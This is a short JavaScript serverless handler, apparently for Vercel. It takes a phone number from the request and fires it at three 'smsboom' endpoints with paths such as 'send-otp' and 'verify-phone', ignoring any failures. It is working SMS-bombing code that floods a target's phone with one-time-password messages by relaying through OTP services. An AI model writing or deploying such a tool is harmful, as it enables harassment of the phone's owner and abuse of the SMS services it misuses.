export default async function handler(req,res){
  const {number}=req.query;
  if(!number) return res.status(400).json({error:"number required"});
  const APIS=[
    "https://smsboom.vercel.app/send-otp",
    "https://smsbooma.vercel.app/verify-phone",
    "https://smsboomc.vercel.app/shikho-send-otp"
  ];
  for(const api of APIS){
    try{ await fetch(`${api}?number=${number}`); }catch{}
  }
  res.json({ok:true});
}